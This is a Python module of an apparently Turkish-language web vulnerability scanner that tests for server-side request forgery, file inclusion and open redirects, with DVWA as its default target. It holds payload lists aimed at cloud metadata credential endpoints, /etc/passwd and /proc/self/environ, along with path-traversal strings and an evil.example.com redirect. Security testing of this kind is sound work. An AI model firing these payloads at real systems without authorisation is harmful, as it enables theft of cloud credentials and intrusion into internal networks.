"""
modules/A10_SSRF.py

OWASP A10:2021 – Server-Side Request Forgery (SSRF)

Test stratejisi (tamamen statik analiz):
  URL Parametresi Tabanlı SSRF:
    - "url", "path", "redirect", "next", "src" gibi URL içeren parametrelere
      dahili adres payload'ları gönderilir.
    - Hata mesajı analizi: dahili bağlantı, connection refused, timeout
      gibi yanıtlar SSRF kanıtı sayılır.
  DVWA File Inclusion (LFI/SSRF):
    - /vulnerabilities/fi/?page= parametresi üzerinden dosya ve URL okuma.
  Cloud Metadata Endpoint:
    - AWS, GCP, Azure metadata URL'leri gönderilir; yanıt içeriği analiz edilir.
  Açık Yönlendirme (Open Redirect):
    - redirect/next/return parametrelerine harici URL gönderilir;
      otomatik yönlendirme harici alana gidiyorsa bulgu oluşur.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests

from core.base_module import BaseModule, Finding, Confidence, Severity
from core.http_client import HTTPClient
from core.llm_client import LLMClient

# ---------------------------------------------------------------------------
# SSRF Payload Kategorileri
# ---------------------------------------------------------------------------

# Dahili ağ ve özel IP aralıkları
_INTERNAL_PAYLOADS: list[str] = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://localhost/",
    "http://localhost:8080/",
    "http://0.0.0.0/",
    "http://[::1]/",                       # IPv6 loopback
    "http://0177.0.0.1/",                  # Oktal kodlama
    "http://2130706433/",                  # Sayısal IP (127.0.0.1)
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

# Cloud metadata endpoint'leri
_CLOUD_METADATA_PAYLOADS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",                          # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/", # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/",               # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",   # Azure
    "http://100.100.100.200/latest/meta-data/",                          # Alibaba Cloud
]

# Dosya okuma SSRF payload'ları
_FILE_PAYLOADS: list[str] = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    "file:///C:/windows/win.ini",
]

# Yanıtta SSRF başarısını gösteren desenler
_SSRF_SUCCESS_PATTERNS: list[re.Pattern] = [
    re.compile(r"root:.*:0:0:",            re.IGNORECASE),  # /etc/passwd
    re.compile(r"\[extensions\]",          re.IGNORECASE),  # win.ini
    re.compile(r"ami-id|instance-id",      re.IGNORECASE),  # AWS metadata
    re.compile(r"computeMetadata",         re.IGNORECASE),  # GCP
    re.compile(r"127\.0\.0\.1",            re.IGNORECASE),  # Loopback yansıması
    re.compile(r"Connection refused",      re.IGNORECASE),  # Dahili port tarama kanıtı
    re.compile(r"failed to open stream.*no route", re.IGNORECASE),
    re.compile(r"SSRF",                    re.IGNORECASE),
]

# SSRF içerebilecek parametre adları
_SSRF_PARAM_NAMES = frozenset([
    "url", "uri", "path", "src", "source", "dest", "destination",
    "host", "site", "page", "file", "document", "load", "fetch",
    "redirect", "next", "return", "returnurl", "return_url",
    "callback", "out", "open", "target", "link", "image",
])

# Açık yönlendirme parametreleri
_REDIRECT_PARAM_NAMES = frozenset([
    "redirect", "next", "return", "returnurl", "return_url",
    "redirect_uri", "redirect_url", "goto", "url", "forward",
])

_OPEN_REDIRECT_PAYLOAD = "https://evil.example.com/phishing"

# DVWA file inclusion endpoint
_DVWA_FI_URL = "/vulnerabilities/fi/"


class A10SSRFModule(BaseModule):
    """OWASP A10:2021 – Server-Side Request Forgery tarayıcı modülü."""

    OWASP_ID = "A10"
    TITLE    = "Server-Side Request Forgery (SSRF)"

    def __init__(
        self,
        target: str,
        http_client: HTTPClient,
        shared_data: Optional[Dict[str, Any]] = None,
        llm_client: Optional[LLMClient] = None,
        enable_llm: bool = True,
    ) -> None:
        super().__init__(target, http_client, shared_data)
        self.llm = llm_client
        self.enable_llm = enable_llm and (llm_client is not None)

    # ------------------------------------------------------------------
    # Ana orkestrasyon
    # ------------------------------------------------------------------

    def run(self) -> List[Finding]:
        self.logger.info("A10 SSRF başlatılıyor → %s", self.target)
        self._test_url_param_ssrf()
        self._test_dvwa_file_inclusion()
        self._test_open_redirect()
        if self.enable_llm:
            self._enrich_with_llm()
        self.logger.info("A10 tamamlandı. %d bulgu.", len(self._findings))
        return self.get_findings()

    # ------------------------------------------------------------------
    # URL Parametresi Tabanlı SSRF
    # ------------------------------------------------------------------

    def _test_url_param_ssrf(self) -> None:
        """shared_data'dan SSRF adayı parametreleri toplar ve test eder."""
        targets: list[tuple[str, str, str]] = []

        for entry in self.shared_data.get("get_params", []):
            url = entry.get("url", "")
            for param in entry.get("params", []):
                if param.lower() in _SSRF_PARAM_NAMES:
                    targets.append((url, param, "GET"))

        for form in self.shared_data.get("forms", []):
            action = form.get("action", self.target)
            method = (form.get("method", "GET") or "GET").upper()
            for inp in form.get("inputs", []):
                if inp and inp.lower() in _SSRF_PARAM_NAMES:
                    targets.append((action, inp, method))

        # shared_data yoksa DVWA fi endpoint'ini varsayılan hedef olarak ekle
        if not targets:
            targets.append((f"{self.target}/vulnerabilities/fi/", "page", "GET"))

        all_payloads = _INTERNAL_PAYLOADS + _CLOUD_METADATA_PAYLOADS + _FILE_PAYLOADS

        for url, param, method in targets:
            responses = self._test_payloads(url, param, all_payloads, method)
            for payload, resp in zip(all_payloads, responses):
                if resp is None:
                    continue

                finding = self._analyze_ssrf_response(url, param, payload, resp)
                if finding:
                    self._add_finding(finding)
                    break  # Parametre başına tek bulgu yeterli

    # ------------------------------------------------------------------
    # DVWA File Inclusion
    # ------------------------------------------------------------------

    def _test_dvwa_file_inclusion(self) -> None:
        """DVWA'nın file inclusion modülünü LFI/SSRF için özel olarak test eder."""
        fi_url = urljoin(self.target + "/", _DVWA_FI_URL.lstrip("/"))
        probe  = self._safe_get(fi_url)
        if not probe or probe.status_code != 200:
            self.logger.debug("DVWA FI endpoint erişilemez: %s", fi_url)
            return

        lfi_payloads = [
            "../../../../../../etc/passwd",
            "../../../../../../etc/hosts",
            "/etc/passwd",
        ]
        rfi_payloads = [
            "http://127.0.0.1/",
            "http://127.0.0.1:8080/",
        ]

        for payload in lfi_payloads + rfi_payloads:
            resp = self._safe_get(fi_url, params={"page": payload})
            if not resp:
                continue

            for sig in _SSRF_SUCCESS_PATTERNS:
                m = sig.search(resp.text)
                if m:
                    is_rfi = payload.startswith("http")
                    snippet = self._extract_context(resp.text, m.start())
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title=(
                            "SSRF – Uzak Dosya Dahil Etme (RFI)" if is_rfi
                            else "SSRF – Yerel Dosya Dahil Etme (LFI)"
                        ),
                        url=fi_url,
                        parameter="page",
                        payload=payload,
                        method="GET",
                        response_snippet=snippet,
                        confidence=Confidence.HIGH,
                        severity=Severity.CRITICAL if not is_rfi else Severity.HIGH,
                        raw_details={
                            "type": "RFI" if is_rfi else "LFI",
                            "payload": payload,
                            "signature": sig.pattern,
                            "status_code": resp.status_code,
                        },
                    ))
                    break

    # ------------------------------------------------------------------
    # Açık Yönlendirme
    # ------------------------------------------------------------------

    def _test_open_redirect(self) -> None:
        """Yönlendirme parametrelerine harici URL göndererek açık redirect arar."""
        targets: list[tuple[str, str]] = []

        for entry in self.shared_data.get("get_params", []):
            url = entry.get("url", "")
            for param in entry.get("params", []):
                if param.lower() in _REDIRECT_PARAM_NAMES:
                    targets.append((url, param))

        if not targets:
            # Genel login/redirect endpoint dene
            for suffix in ["/login.php", "/redirect", "/go"]:
                targets.append((urljoin(self.target + "/", suffix.lstrip("/")), "next"))
                targets.append((urljoin(self.target + "/", suffix.lstrip("/")), "redirect"))

        evil_host = urlparse(_OPEN_REDIRECT_PAYLOAD).netloc

        for url, param in targets:
            resp = self._safe_get(url, params={param: _OPEN_REDIRECT_PAYLOAD})
            if not resp:
                continue

            final_host = urlparse(resp.url).netloc
            # Otomatik yönlendirme harici alana gittiyse → açık yönlendirme
            if evil_host in final_host:
                self._add_finding(Finding(
                    owasp_id=self.OWASP_ID,
                    title="SSRF / Açık Yönlendirme – Harici Alana Redirect",
                    url=url,
                    parameter=param,
                    payload=_OPEN_REDIRECT_PAYLOAD,
                    method="GET",
                    response_snippet=f"Yönlendirildi: {resp.url}",
                    confidence=Confidence.HIGH,
                    severity=Severity.MEDIUM,
                    raw_details={
                        "final_url": resp.url,
                        "expected_host": evil_host,
                    },
                ))
            elif resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if evil_host in location:
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title="SSRF / Açık Yönlendirme – Location Başlığında Harici Alan",
                        url=url,
                        parameter=param,
                        payload=_OPEN_REDIRECT_PAYLOAD,
                        method="GET",
                        response_snippet=f"Location: {location}",
                        confidence=Confidence.HIGH,
                        severity=Severity.MEDIUM,
                        raw_details={
                            "location_header": location,
                            "status_code": resp.status_code,
                        },
                    ))

    # ------------------------------------------------------------------
    # SSRF Yanıt Analizi
    # ------------------------------------------------------------------

    def _analyze_ssrf_response(
        self,
        url: str,
        param: str,
        payload: str,
        resp: requests.Response,
    ) -> Optional[Finding]:
        """Yanıt içeriğini SSRF başarı desenlerine karşı analiz eder."""
        body = resp.text

        for sig in _SSRF_SUCCESS_PATTERNS:
            m = sig.search(body)
            if m:
                snippet = self._extract_context(body, m.start())
                is_file   = payload.startswith("file://")
                is_cloud  = "169.254" in payload or "metadata" in payload
                severity  = Severity.CRITICAL if is_file or is_cloud else Severity.HIGH
                return Finding(
                    owasp_id=self.OWASP_ID,
                    title=(
                        "SSRF – Cloud Metadata Erişimi" if is_cloud else
                        "SSRF – Yerel Dosya Okuma" if is_file else
                        "SSRF – Dahili Ağ Erişimi"
                    ),
                    url=url,
                    parameter=param,
                    payload=payload,
                    method=resp.request.method if resp.request else "GET",
                    response_snippet=snippet,
                    confidence=Confidence.HIGH,
                    severity=severity,
                    raw_details={
                        "signature_matched": sig.pattern,
                        "payload_type": "cloud" if is_cloud else "file" if is_file else "internal",
                        "status_code": resp.status_code,
                    },
                )

        # Hata bazlı SSRF: dahili bağlantı girişiminin hata mesajı
        error_hints = [
            "connection refused", "no route to host", "failed to connect",
            "couldn't connect", "network unreachable", "timed out",
        ]
        body_lower = body.lower()
        for hint in error_hints:
            if hint in body_lower:
                idx     = body_lower.find(hint)
                snippet = self._extract_context(body, idx)
                return Finding(
                    owasp_id=self.OWASP_ID,
                    title="SSRF – Dahili Bağlantı Hatası (Blind SSRF İzleme)",
                    url=url,
                    parameter=param,
                    payload=payload,
                    method=resp.request.method if resp.request else "GET",
                    response_snippet=snippet,
                    confidence=Confidence.MEDIUM,
                    severity=Severity.HIGH,
                    raw_details={
                        "error_hint": hint,
                        "status_code": resp.status_code,
                        "note": "Blind SSRF; sunucu iç ağa bağlanmayı denedi, hata mesajı döndü.",
                    },
                )

        return None

    # ------------------------------------------------------------------
    # Zorunlu arayüz
    # ------------------------------------------------------------------

    def _test_payloads(
        self,
        url: str,
        param: str,
        payloads: List[str],
        method: str = "GET",
        base_data: Optional[Dict[str, str]] = None,
    ) -> List[Optional[requests.Response]]:
        responses: List[Optional[requests.Response]] = []
        base = base_data.copy() if base_data else {}
        for payload in payloads:
            resp = None
            try:
                if method == "POST":
                    resp = self.http.post(url, data={**base, param: payload})
                else:
                    resp = self.http.get(url, params={**base, param: payload})
            except Exception as exc:
                self.logger.debug("SSRF payload başarısız [%s=%r]: %s", param, payload[:40], exc)
            finally:
                responses.append(resp)
        return responses

    def _enrich_with_llm(self) -> None:
        if not self._findings or self.llm is None:
            return
        self.logger.info("A10 LLM zenginleştirme (%d bulgu)...", len(self._findings))
        for finding in self._findings:
            try:
                finding.llm_analysis = self.llm.query(finding.to_dict())
            except Exception as exc:
                finding.llm_analysis = {"llm_hatasi": True, "hata_nedeni": str(exc)}

    # ------------------------------------------------------------------
    # Yardımcılar
    # ------------------------------------------------------------------

    def _extract_context(self, text: str, pos: int, window: int = 200) -> str:
        start   = max(0, pos - window // 2)
        end     = min(len(text), pos + window // 2)
        snippet = text[start:end].strip()
        if start > 0:
            snippet = "…" + snippet
        if end < len(text):
            snippet += "…"
        return snippet
